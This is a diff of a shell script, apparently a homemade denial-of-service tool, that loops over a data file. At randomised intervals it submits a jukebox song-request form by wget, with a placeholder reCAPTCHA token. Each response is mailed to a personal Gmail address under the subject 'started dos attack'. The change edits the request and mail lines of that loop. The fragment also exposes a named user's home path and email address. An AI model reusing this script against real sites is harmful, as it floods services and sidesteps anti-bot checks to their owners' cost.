@@ -15,7 +15,8 @@ cat /Users/nikhilkulkarni/Documents/Jukeboxform/dass-attk/data.txt | while read 
 do
    sleep_time=`random $start_time $end_time`
    sleep $sleep_time 
-   /usr/local/bin/wget "http://localhost:8000/cgi-bin/form_get.py?Song=${name}&g-recaptcha-response=03AGdBq26&cc=${cc}&submit=Submit" > /Users/nikhilkulkarni/Documents/Jukeboxform/dass-attk/${name}.html
+   Result="`/usr/local/bin/wget -qO- "http://localhost.com:8000/cgi-bin/form_get.py?Song=${name}&g-recaptcha-response=03A&cc=${cc}&submit=Submit"`"
+
    
-  uuencode /Users/nikhilkulkarni/Documents/Jukeboxform/dass-attk/${name}.html | mail -s "started dos attack"  priyamuchandikar@gmail.com
+   echo ${Result} echo ${name} | mail -s "started dos attack"  priyamuchandikar@gmail.com
 done
